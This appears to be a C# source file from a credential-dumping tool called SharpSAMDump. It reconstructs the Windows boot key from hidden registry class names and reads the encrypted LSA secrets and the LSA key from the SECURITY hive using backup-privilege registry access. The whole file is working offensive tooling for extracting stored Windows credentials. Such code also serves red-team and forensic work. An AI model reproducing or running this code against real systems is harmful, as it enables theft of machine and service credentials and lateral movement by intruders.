using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;

namespace SharpSAMDump
{
    public class LSASecret
    {
        public readonly string Name;

        public readonly int Version;
        public readonly byte[] EncKeyID;
        public readonly int EncAlgorithm;
        public readonly int Flags;
        public readonly byte[] EncryptedSecret;

        public LSASecret(string name, byte[] blob)
        {
            Name = name;

            int offset = 0;

            Version = BitConverter.ToInt32(blob, offset);
            offset += 4;

            EncKeyID = new byte[16];
            Array.Copy(blob, offset, EncKeyID, 0, EncKeyID.Length);
            offset += EncKeyID.Length;

            EncAlgorithm = BitConverter.ToInt32(blob, offset);
            offset += 4;

            Flags = BitConverter.ToInt32(blob, offset);
            offset += 4;


            int encryptedDataLength = blob.Length - offset;
            EncryptedSecret = new byte[encryptedDataLength];
            if (encryptedDataLength > 0)
            {
                Array.Copy(blob, offset, EncryptedSecret, 0, encryptedDataLength);
                offset += encryptedDataLength;
            }
        }
    }

    public class DecryptedLSASecret
    {
        public readonly byte[] Data;

        public DecryptedLSASecret(byte[] data)
        {
            int offset = 0;
            int length = BitConverter.ToInt32(data, offset);
            offset += 4;

            offset += 12; // unknown

            Data = new byte[length];
            if (length > 0)
            {
                Array.Copy(data, offset, Data, 0, length);
                offset += length;
            }
        }
    }

    public static class LSA
    {
        public static byte[] GetBootKey()
        {
            string[] names = new string[] { "JD", "Skew1", "GBG", "Data" };
            int[] indices = new int[] { 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 };

            string scrambledKeyString = "";
            foreach (string name in names)
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKeyForBackup($"SYSTEM\\CurrentControlSet\\Control\\Lsa\\{name}"))
                {
                    scrambledKeyString += key.GetClassName();
                }
            }

            byte[] scrambledKeyBytes = Util.FromHexString(scrambledKeyString);

            byte[] keyBytes = new byte[indices.Length];
            for (int i=0; i<indices.Length; i++)
            {
                keyBytes[i] = scrambledKeyBytes[indices[i]];
            }

            return keyBytes;
        }

        public static LSASecret[] GetEntries()
        {
            List<LSASecret> entries = new List<LSASecret>();

            using (RegistryKey secretsKey = Registry.LocalMachine.OpenSubKeyForBackup($"SECURITY\\Policy\\Secrets\\"))
            {
                string[] subkeys = secretsKey.GetSubKeyNames();
                foreach (string subkey in subkeys)
                {
                    try
                    {
                        using (RegistryKey secretKey = secretsKey.OpenSubKeyForBackup($"{subkey}\\CurrVal"))
                        {
                            byte[] data = (byte[])secretKey.GetValue("");

                            LSASecret secret = new LSASecret(subkey, data);
                            entries.Add(secret);
                        }
                    }
                    catch (Win32Exception)
                    {
                        continue;
                    }
                }
            }

            return entries.ToArray();
        }

        public static byte[] GetEncryptedLSAKey()
        {
            using (RegistryKey key = Registry.LocalMachine.OpenSubKeyForBackup($"SECURITY\\Policy\\PolEKList"))
            {
                byte[] data = (byte[])key.GetValue("");
                return new LSASecret("", data).EncryptedSecret;
            }
        }
    }
}
